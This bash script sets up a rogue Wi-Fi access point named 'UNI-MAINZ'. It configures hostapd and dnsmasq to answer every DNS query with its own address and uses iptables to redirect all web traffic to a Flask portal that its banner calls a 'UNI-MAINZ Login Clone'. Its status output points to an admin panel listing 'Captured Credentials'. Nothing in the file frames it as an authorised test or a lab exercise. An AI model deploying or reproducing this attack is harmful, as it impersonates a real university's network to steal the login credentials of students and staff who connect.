#!/bin/bash

# Rogue Captive Portal Setup Script
# This script sets up a rogue access point that redirects all traffic to the Flask captive portal

# Variables
SSID="UNI-MAINZ"
INTERFACE="wlan0"
ETHERNET="eth0"
GATEWAY_IP="192.168.10.1"
DHCP_RANGE_START="192.168.10.10"
DHCP_RANGE_END="192.168.10.100"
FLASK_PORT=8080
DOMAIN="login.uni-mainz.de"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}This script must be run as root${NC}" 
   exit 1
fi

# Function to print status messages
print_status() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# Install necessary packages
install_dependencies() {
    print_status "Installing dependencies..."
    apt-get update
    apt-get install -y hostapd dnsmasq iptables python3 python3-pip python3-venv
    
    # Stop services to configure them
    systemctl stop hostapd
    systemctl stop dnsmasq
    systemctl stop NetworkManager
}

# Configure hostapd (Wi-Fi Access Point)
configure_hostapd() {
    print_status "Configuring hostapd..."
    
    cat <<EOF > /etc/hostapd/hostapd.conf
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

    # Set the config file location
    sed -i 's|#DAEMON_CONF=""|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd
    
    print_status "hostapd configured"
}

# Configure dnsmasq (DHCP and DNS server)
configure_dnsmasq() {
    print_status "Configuring dnsmasq..."
    
    # Backup original config
    if [ -f /etc/dnsmasq.conf ]; then
        mv /etc/dnsmasq.conf /etc/dnsmasq.conf.backup
    fi
    
    cat <<EOF > /etc/dnsmasq.conf
# Interface to bind to
interface=$INTERFACE

# DHCP range
dhcp-range=$DHCP_RANGE_START,$DHCP_RANGE_END,255.255.255.0,12h

# Gateway
dhcp-option=3,$GATEWAY_IP

# DNS Server
dhcp-option=6,$GATEWAY_IP

# Redirect all DNS queries to our IP
address=/#/$GATEWAY_IP

# Log queries
log-queries
log-dhcp

# Don't read /etc/resolv.conf
no-resolv

# Don't poll /etc/resolv.conf
no-poll
EOF

    print_status "dnsmasq configured"
}

# Configure network interface
configure_network() {
    print_status "Configuring network interface..."
    
    # Bring down the interface
    ip link set dev $INTERFACE down
    
    # Set interface to monitor mode first, then managed
    ip link set dev $INTERFACE up
    
    # Assign static IP
    ip addr flush dev $INTERFACE
    ip addr add $GATEWAY_IP/24 dev $INTERFACE
    ip link set dev $INTERFACE up
    
    print_status "Network interface configured with IP $GATEWAY_IP"
}

# Enable IP forwarding and configure iptables
configure_iptables() {
    print_status "Configuring iptables and IP forwarding..."
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf
    
    # Flush existing rules
    iptables -F
    iptables -t nat -F
    iptables -t mangle -F
    iptables -X
    
    # Allow established connections
    iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
    
    # Allow traffic on loopback
    iptables -A INPUT -i lo -j ACCEPT
    
    # Allow DHCP and DNS
    iptables -A INPUT -p udp --dport 67 -j ACCEPT
    iptables -A INPUT -p udp --dport 53 -j ACCEPT
    iptables -A INPUT -p tcp --dport 53 -j ACCEPT
    
    # Allow HTTP/HTTPS traffic to our Flask app
    iptables -A INPUT -p tcp --dport 80 -j ACCEPT
    iptables -A INPUT -p tcp --dport 443 -j ACCEPT
    iptables -A INPUT -p tcp --dport $FLASK_PORT -j ACCEPT
    
    # Redirect all HTTP traffic to our Flask app
    iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port $FLASK_PORT
    iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j REDIRECT --to-port $FLASK_PORT
    
    # NAT for internet access (if you want to provide internet)
    # Uncomment the following line if you want to provide internet access through eth0
    # iptables -t nat -A POSTROUTING -o $ETHERNET -j MASQUERADE
    
    # Save iptables rules
    if command -v iptables-save &> /dev/null; then
        iptables-save > /etc/iptables/rules.v4
    fi
    
    print_status "iptables configured"
}

# Start services
start_services() {
    print_status "Starting services..."
    
    # Start dnsmasq
    systemctl start dnsmasq
    systemctl enable dnsmasq
    
    # Start hostapd
    systemctl unmask hostapd
    systemctl start hostapd
    systemctl enable hostapd
    
    # Check if services are running
    if systemctl is-active --quiet hostapd; then
        print_status "hostapd is running"
    else
        print_error "hostapd failed to start"
        journalctl -u hostapd -n 50
    fi
    
    if systemctl is-active --quiet dnsmasq; then
        print_status "dnsmasq is running"
    else
        print_error "dnsmasq failed to start"
        journalctl -u dnsmasq -n 50
    fi
}

# Setup Flask application
setup_flask() {
    print_status "Setting up Flask application..."
    
    SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
    
    # Check if virtual environment exists
    if [ ! -d "$SCRIPT_DIR/.venv" ]; then
        print_warning "Virtual environment not found. Creating one..."
        python3 -m venv "$SCRIPT_DIR/.venv"
        "$SCRIPT_DIR/.venv/bin/pip" install flask
    fi
    
    print_status "Flask environment ready"
}

# Start Flask application
start_flask() {
    print_status "Starting Flask application..."
    
    SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
    
    # Kill any existing Flask processes
    pkill -f "app.py"
    
    # Start Flask in background
    cd "$SCRIPT_DIR"
    nohup .venv/bin/python3 app.py > flask.log 2>&1 &
    
    sleep 2
    
    if pgrep -f "app.py" > /dev/null; then
        print_status "Flask application started on port $FLASK_PORT"
    else
        print_error "Flask application failed to start"
        cat flask.log
    fi
}

# Display status
show_status() {
    echo ""
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  Rogue Captive Portal Status${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo -e "SSID: ${YELLOW}$SSID${NC}"
    echo -e "Gateway IP: ${YELLOW}$GATEWAY_IP${NC}"
    echo -e "DHCP Range: ${YELLOW}$DHCP_RANGE_START - $DHCP_RANGE_END${NC}"
    echo -e "Flask Port: ${YELLOW}$FLASK_PORT${NC}"
    echo ""
    echo -e "${GREEN}Services:${NC}"
    systemctl is-active --quiet hostapd && echo -e "  hostapd: ${GREEN}RUNNING${NC}" || echo -e "  hostapd: ${RED}STOPPED${NC}"
    systemctl is-active --quiet dnsmasq && echo -e "  dnsmasq: ${GREEN}RUNNING${NC}" || echo -e "  dnsmasq: ${RED}STOPPED${NC}"
    pgrep -f "app.py" > /dev/null && echo -e "  Flask: ${GREEN}RUNNING${NC}" || echo -e "  Flask: ${RED}STOPPED${NC}"
    echo ""
    echo -e "${GREEN}Admin Panel:${NC} http://$GATEWAY_IP:$FLASK_PORT/admin"
    echo -e "${GREEN}Captured Credentials:${NC} Check the admin panel"
    echo ""
    echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
    echo -e "${GREEN}========================================${NC}"
}

# Cleanup function
cleanup() {
    print_warning "Stopping services..."
    
    systemctl stop hostapd
    systemctl stop dnsmasq
    pkill -f "app.py"
    
    # Restore network
    ip addr flush dev $INTERFACE
    systemctl start NetworkManager
    
    print_status "Cleanup complete"
}

# Trap Ctrl+C
trap cleanup EXIT INT TERM

# Main function
main() {
    echo -e "${GREEN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║   Rogue Captive Portal Setup          ║"
    echo "║   UNI-MAINZ Login Clone               ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${NC}"
    
    install_dependencies
    configure_network
    configure_hostapd
    configure_dnsmasq
    configure_iptables
    setup_flask
    start_services
    start_flask
    show_status
    
    # Keep script running
    while true; do
        sleep 10
    done
}

# Run main function
main
